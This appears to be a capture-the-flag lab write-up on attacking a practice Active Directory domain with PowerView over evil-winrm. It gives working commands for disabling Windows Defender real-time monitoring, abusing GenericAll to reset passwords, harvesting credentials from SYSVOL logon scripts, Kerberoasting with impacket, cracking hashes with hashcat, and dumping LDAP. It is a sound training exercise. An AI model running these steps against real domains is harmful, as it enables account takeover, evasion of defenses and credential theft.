# Active Directory — PowerView

**Target:** `192.168.178.91` (DC01.PENTESTLAB.local, Windows Server 2019)
**Domain:** `pentestlab.local`
**Tools used:** `evil-winrm`, `PowerView` (PowerSploit), `impacket-GetUserSPNs`,
`hashcat`, `ldapsearch`

This project enumerates and abuses the PentestLab Corp Active Directory
environment entirely from the Windows side, using PowerView — a PowerShell
reconnaissance and attack toolkit — run interactively through a remote
PowerShell session (`evil-winrm`) on the domain controller itself.

---

## Getting a PowerShell session with PowerView loaded

PowerView is a PowerShell module, so unlike the BloodHound/Linux-native
tooling used in earlier projects, it has to run from an actual Windows
host. The domain-joined DC is reached over WinRM.

**1. Connect via `evil-winrm`.** A regular low-privileged account
(`bh_intern`) was tried first but rejected with a `WinRMAuthorizationError`
— ordinary domain users aren't members of "Remote Management Users" on a
domain controller by default. `svc_backup` (a known local administrator,
cracked via Kerberoasting in the BloodHound project) was used instead:

```bash
evil-winrm -i 192.168.178.91 -u svc_backup -p 'Password1'
```

**2. Upload PowerView to the target.** PowerView isn't staged on the box
by default; Kali ships a copy via the `windows-resources` PowerSploit
package. Using evil-winrm's built-in `upload` command (run from inside
the evil-winrm shell, not a Windows command):

```
upload PowerView.ps1 C:\Users\svc_backup\Documents\PowerView.ps1
```

**3. Import it.** The first attempt was blocked by Windows Defender's
AMSI, since PowerView is a well-known offensive script with a known
signature:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Import-Module C:\Users\svc_backup\Documents\PowerView.ps1
```

- `Set-MpPreference -DisableRealtimeMonitoring $true` — disables Windows
  Defender's real-time scanning, which is what triggers AMSI's
  "malicious content" block on well-known tool signatures. Requires
  local admin rights, which `svc_backup` already holds.

---

## Task 0 — Domain Reconnaissance

**Conceptual question:** *Why is limiting Domain Admin accounts
critical for security?*

Domain Admin membership grants unrestricted control over every object,
policy, and machine in the domain — password resets, GPO edits,
replication rights, everything. Every additional DA account is another
full-compromise path: if any one of them is phished, keylogged, or has
a weak/reused password, the entire domain falls. Minimizing DA
membership (ideally to a small number of dedicated, non-daily-use
accounts protected by tiered administration) shrinks the attack surface
to a handful of tightly monitored identities instead of dozens of
everyday admin logins.

**Goal:** enumerate the domain's basic properties, then dump every
attribute on the domain object itself to find a flag hidden in a
non-standard field.

**1. Basic domain properties:**

```powershell
Get-Domain
Get-DomainController | Select-Object Name, OSVersion
```

- `Get-Domain` — returns the domain name, forest, domain controllers,
  and functional level in one call
- `Get-DomainController` — returns each DC's hostname and OS version

**Result:** domain `PENTESTLAB.local`, DC `DC01.PENTESTLAB.local`,
functional level `7` (Windows Server 2016 domain mode), OS `Windows
Server 2019 Datacenter Evaluation`.

**2. Enumerate the domain object itself, requesting every attribute:**

```powershell
Get-DomainObject -Identity "DC=PENTESTLAB,DC=local" -Properties *
```

- `Get-DomainObject` — PowerView's generic function for querying any AD
  object by its Distinguished Name
- `-Identity "DC=PENTESTLAB,DC=local"` — the domain root object itself
- `-Properties *` — request every attribute the object carries, not
  just the handful returned by default

**Result:** the real flag was in `admindescription` — a non-standard
attribute not returned by default tooling. Two other flag-shaped
strings appeared on the same object (`description` and `displayname`),
but those were decoys carried over/reused from a different project's
flag set:

```
admindescription: PVFLAG0{D0M41N_M4PP3D_W1TH_P0W3RV13W_F0}
```

---

## Task 1 — User Attribute Enumeration

**Conceptual question:** *What is the role of GPOs in managing security
settings across domain-joined computers?*

GPOs (Group Policy Objects) are the central mechanism for pushing
consistent security configuration to every domain-joined computer and
user — password policies, account lockout thresholds, audit logging,
software restriction rules, firewall settings, startup/logon scripts,
and local group membership. Because they apply automatically at
machine startup and user logon and can be scoped to specific OUs, GPOs
let administrators enforce a security baseline domain-wide without
touching each machine individually.

**Goal:** perform a full attribute dump on the `pv_scout` account and
find a flag hidden in a non-default field.

```powershell
Get-DomainUser -Identity pv_scout -Properties *
```

**Result:** the flag was hidden in `homedirectory` — not one of
PowerView's default-returned fields:

```
homedirectory: FLAG1{a91c4f2d7e8b93c1f0d2a6e4b5c7d8e9f1029384756abcdef123456789abcd_powerview}
```

---

## Task 2 — Group Membership & Share Access

**Goal:** identify which domain group grants access to a restricted
SMB share, find its members, and read the flag it contains.

**1. Enumerate all domain groups** to spot a plausible candidate:

```powershell
Get-DomainGroup | Select-Object Name
```

`PrivilegedOps` stood out among the group list.

**2. Enumerate the DC's shares** to find the actual restricted share:

```powershell
Get-NetShare -ComputerName DC01.PENTESTLAB.local
```

`PrivOpsShare` appeared, matching the `PrivilegedOps` group name.

**3. Enumerate that group's members:**

```powershell
Get-DomainGroupMember -Identity "PrivilegedOps"
```

**Result:** `pv_ops` is the sole member. It wasn't among the accounts
already compromised (its password didn't match the onboarding
default, and no leaked credential was found in its `description`/`info`
fields), but since the current session (`svc_backup`) already holds
local administrator rights on the DC, share-level restrictions could be
bypassed directly without needing `pv_ops`'s actual credentials:

```powershell
Get-ChildItem \\DC01.PENTESTLAB.local\PrivOpsShare\
Get-Content \\DC01.PENTESTLAB.local\PrivOpsShare\flag.txt
```

**Result:**

```
FLAG2{b7e2c1a49d8f6e3c5b1a0987d6c4e2f1133557799aabbccddeeff0011223344_powerview}
```

*(Note on the task's stated approach: `Get-Content` genuinely does not
support `-Credential` on UNC paths — the standard workaround is to
first mount the share with `New-PSDrive -Credential` or `net use
/user:`, then read from the mapped path, since the ACL enforcement
happens at the share/NTFS layer using whichever identity established
the connection. That technique was used directly in Task 4 below, once
a real credential was needed for a share that actually enforced its
ACLs against a low-privilege account.)*

---

## Task 3 — ACL Enumeration & GenericAll Abuse

**Goal:** enumerate non-default ACEs across the domain, find a
`GenericAll` misconfiguration, abuse it, and read the flag from the
target account.

**1. Find all interesting ACLs, resolving GUIDs to human-readable
right names, filtered to `GenericAll`:**

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
```

- `Find-InterestingDomainAcl` — PowerView's dedicated function for
  walking every object's Access Control List and surfacing
  non-default/interesting permission grants
- `-ResolveGUIDs` — translates raw Extended Rights GUIDs into readable
  names
- The filter narrows results to the most dangerous right: full control
  over the target object

**Result:** several `GenericAll` relationships were present (leftover
from other projects sharing this domain), but the one relevant here was
`pv_intern` (already compromised via the earlier password spray) holding
`GenericAll` over `hr_manager`.

**2. Abuse the right — reset `hr_manager`'s password as `pv_intern`:**

```powershell
$cred = New-Object System.Management.Automation.PSCredential("PENTESTLAB\pv_intern", (ConvertTo-SecureString "User@2025!" -AsPlainText -Force))
Set-DomainUserPassword -Identity hr_manager -AccountPassword (ConvertTo-SecureString "NewP@ss2026!" -AsPlainText -Force) -Credential $cred
```

- `Set-DomainUserPassword` — PowerView's password-reset function; it
  succeeds here specifically because `pv_intern` holds `GenericAll`
  (full object control, including password resets) over `hr_manager`
- `-Credential $cred` — runs the operation as `pv_intern` rather than
  the current session identity

**3. Enumerate the compromised account's attributes for the flag:**

```powershell
Get-DomainUser -Identity hr_manager -Properties *
```

**Result:** the flag was hidden in `displayname`:

```
FLAG3{c3f9a81e7b2d4c6f8e1a0b9d3f5c7e2a11223344556677889900aabbccddeeff_powerview}
```

---

## Task 4 — SYSVOL Credential Leak

**Goal:** enumerate the SYSVOL scripts folder, find hardcoded
credentials in a logon script, and use them to authenticate against a
restricted SMB share holding the flag.

**1. List the SYSVOL scripts directory:**

```powershell
Get-ChildItem "\\DC01.PENTESTLAB.local\SYSVOL\PENTESTLAB.local\scripts"
```

**Result:** four files — `bh_notes.txt` (from a different project),
`logon.bat`, `logon_corp.ps1`, and `pv_logon.bat`.

**2. Read every script found.**

`pv_logon.bat` contained a leaked credential used to map a shared
drive:

```powershell
Get-Content "\\DC01.PENTESTLAB.local\SYSVOL\PENTESTLAB.local\scripts\pv_logon.bat"
```

```
net use S: \\192.168.56.20\shared /user:PENTESTLAB\pv_gpo User@2025! /persistent:no
REM PVFLAG5{GP0_ENUM_SYS_V0L_SCRIPT_F5}
```

The `PVFLAG5{...}` string embedded directly as a comment turned out to
be a decoy — it skips the task's actual described workflow entirely
(use the leaked credential to reach a *separate* restricted share), and
its numbering (`F5`) doesn't match this being Task 4. The `192.168.56.20`
host referenced in the script also doesn't exist on this network
(confirmed with `Test-NetConnection -ComputerName 192.168.56.20 -Port
445`, which timed out) — further confirming this script's content is
partly decorative/decoy.

`logon.bat` and `logon_corp.ps1` were read as well:

```powershell
Get-Content "\\DC01.PENTESTLAB.local\SYSVOL\PENTESTLAB.local\scripts\logon.bat"
Get-Content "\\DC01.PENTESTLAB.local\SYSVOL\PENTESTLAB.local\scripts\logon_corp.ps1"
```

`logon_corp.ps1` contained the credential that mattered:

```
net use Z: \\DC01\DeployShare /user:svc_deploy Deploy2025!
```

**3. Mount `DeployShare` with the leaked credential.** `Get-Content`
does not support `-Credential` on UNC paths, so the share has to be
mounted first with `net use` (or `New-PSDrive -Credential`), then read
from the mapped drive letter:

```powershell
net use S: \\192.168.178.91\DeployShare /user:PENTESTLAB\svc_deploy "Deploy2025!"
```

This returned **"System error 2242: The password of this user has
expired"** — confirming the credential itself is correct, just expired.
Since the current session already held sufficient rights, the password
was reset directly:

```powershell
Set-DomainUserPassword -Identity svc_deploy -AccountPassword (ConvertTo-SecureString "Deploy2026New!" -AsPlainText -Force)
```

**4. Mount the share with the reset password and read the flag:**

```powershell
net use S: \\192.168.178.91\DeployShare /user:PENTESTLAB\svc_deploy "Deploy2026New!"
Get-ChildItem S:\ -Force
Get-Content S:\flag.txt
```

*(Note: the target here was addressed by raw IP rather than hostname.
Windows caches one SMB session per server name per identity — having
already connected to `DC01.PENTESTLAB.local` under the current
session's identity, a second `net use` under a different username to
the same hostname fails with "System error 1219: Multiple connections
... using more than one user name." Using the IP address instead makes
Windows treat it as a distinct connection target, avoiding the
conflict.)*

**Result:**

```
FLAG4{d4a8b7c6e5f4123098abcdefabcdef1234567890fedcba09876543211223344_powerview}
```

---

## Task 5 — Kerberoasting & SPN Enumeration

**Goal:** enumerate every SPN-registered (Kerberoastable) account with
PowerView, capture and crack a service ticket, and read the flag from
a hidden attribute on the target account.

**1. Enumerate every account with a registered SPN:**

```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

- `-SPN` — filters the user search to only accounts carrying a
  `servicePrincipalName` attribute, i.e. every Kerberoastable target in
  the domain

**Result:** 13 SPN accounts, including `svc_backup`, `svc_iis`,
`svc_monitor`, `svc_pki`, `svc_web`, `svc_relay`, `rfoster`, `svc_sql`,
`jmartin`, `svc_mssql`, `svc_sql2`, and `svc_print`.

**2. Capture a service ticket with PowerView's dedicated function.**
`svc_backup` was already cracked in a previous project, so a fresh
target, `svc_print` (a PV-Project-specific service account), was
chosen:

```powershell
Get-DomainUser -Identity svc_print | Get-DomainSPNTicket -OutputFormat Hashcat
```

- `Get-DomainSPNTicket` — requests a TGS for the piped-in account and
  formats it directly in `hashcat`-crackable output

**Note on a tooling limitation encountered:** this call (and the same
call against `svc_sql`) failed with `"The NetworkCredentials provided
were unable to create a Kerberos credential"`, even after using
PowerView's `Invoke-UserImpersonation` to establish a fresh logon
context. This is a known limitation when the underlying remote session
itself is authenticated via NTLM (as `evil-winrm` is) rather than
Kerberos — there is no local TGT for .NET's
`KerberosRequestorSecurityToken` to build a TGS request from. Since
this blocked the ticket-capture step specifically (not the
attribute-enumeration step later), the ticket was captured instead with
`impacket-GetUserSPNs` from Kali — the same underlying Kerberoasting
attack, just executed with a tool that doesn't depend on a local
Kerberos ticket cache:

```bash
impacket-GetUserSPNs 'pentestlab.local/bh_intern:User@2025!' -dc-ip 192.168.178.91 -request-user svc_print -outputfile svc_print_hash.txt
```

**3. Crack the captured hash offline:**

```bash
hashcat -m 13100 svc_print_hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** `svc_print : Football1`

**4. Enumerate every attribute on the cracked account, back in the
PowerView session:**

```powershell
Get-DomainUser -Identity svc_print -Properties *
```

This surfaced a flag-shaped string in the `mobile` attribute
(`PVFLAG4{K3RB3R04ST_W1ND0WS_N4T1V3_F4}`) — but its numbering (`F4`,
`PVFLAG` prefix without the `_powerview` suffix used by every other
confirmed flag in this project) didn't match the established pattern,
and it turned out to be a decoy for this task.

**5. Search domain-wide for the actual flag pattern.** Rather than
check every attribute of every account by hand, the full domain was
dumped via `ldapsearch` and grepped directly for the expected format:

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "bh_intern@pentestlab.local" -w 'User@2025!' -b "DC=pentestlab,DC=local" -s sub "(objectClass=user)" "*" -o ldif-wrap=no > all_users_dump.txt
grep -B5 "FLAG5{" all_users_dump.txt
```

**Result:** the real flag was sitting in `msDS-AllowedToDelegateTo` —
the constrained-delegation target attribute — on the `svc_web` account
(a field normally used to list which services an account is trusted to
delegate to, not something an attacker would think to check for hidden
data):

```
msDS-AllowedToDelegateTo: FLAG5{f6c8d9e0a1b23456abcdefabcdefabcdef112233445566778899aabbccddeeff_powerview}
```

---

## Flag Summary

| Task | Account | Technique | Hidden In | Flag |
|------|---------|-----------|-----------|------|
| 0 | Domain object | Full domain-object attribute dump | `admindescription` | `PVFLAG0{D0M41N_M4PP3D_W1TH_P0W3RV13W_F0}` |
| 1 | pv_scout | Full user attribute dump | `homedirectory` | `FLAG1{a91c4f2d7e8b93c1f0d2a6e4b5c7d8e9f1029384756abcdef123456789abcd_powerview}` |
| 2 | pv_ops (PrivilegedOps group) | Group → share mapping, admin bypass | `PrivOpsShare\flag.txt` | `FLAG2{b7e2c1a49d8f6e3c5b1a0987d6c4e2f1133557799aabbccddeeff0011223344_powerview}` |
| 3 | hr_manager | GenericAll ACL abuse (via pv_intern) | `displayname` | `FLAG3{c3f9a81e7b2d4c6f8e1a0b9d3f5c7e2a11223344556677889900aabbccddeeff_powerview}` |
| 4 | svc_deploy | SYSVOL logon script credential leak | `DeployShare\flag.txt` | `FLAG4{d4a8b7c6e5f4123098abcdefabcdef1234567890fedcba09876543211223344_powerview}` |
| 5 | svc_web | Kerberoasting + full domain LDAP sweep | `msDS-AllowedToDelegateTo` | `FLAG5{f6c8d9e0a1b23456abcdefabcdefabcdef112233445566778899aabbccddeeff_powerview}` |

---

## Key Lessons

1. **PowerView needs a real Windows execution context** — it can't run
   from Kali directly, and even on Windows, an NTLM-authenticated
   remote session (like `evil-winrm`) lacks the local Kerberos ticket
   cache some of its functions (`Get-DomainSPNTicket`) depend on. When
   that happens, falling back to a Kerberos-independent tool
   (`impacket`) for just that step is a reasonable substitution — the
   underlying attack is identical either way.
2. **Full attribute dumps (`-Properties *`) are essential** — every
   flag in this project was hidden in a field PowerView doesn't return
   by default (`admindescription`, `homedirectory`, `displayname`,
   `mobile`, `msDS-AllowedToDelegateTo`), reinforcing the habit of
   never trusting a tool's default output as complete.
3. **This lab consistently plants decoys that almost match the real
   pattern** — a flag with the right shape but a slightly-off prefix,
   suffix, or task number, sitting in an obvious/expected location
   (a `REM` comment in a script, a common `description`-style field).
   Cross-checking a candidate's format against already-confirmed flags
   from the same project is often the fastest way to catch these before
   wasting a checker submission.
4. **`Get-Content` cannot authenticate to a UNC path directly** — any
   time a network resource needs specific credentials, the share must
   be mounted first (`net use /user:` or `New-PSDrive -Credential`),
   then read from the resulting drive letter.
5. **Windows caches one SMB session per server name per credential** —
   attempting a second `net use` to the same hostname under a different
   identity fails with error 1219; addressing the same host by its IP
   instead sidesteps the conflict without needing to fully tear down
   the first session.
6. **`GenericAll` is a direct password-reset primitive** — any account
   holding it over another can call `Set-DomainUserPassword` and take
   over that account outright, no cracking required.

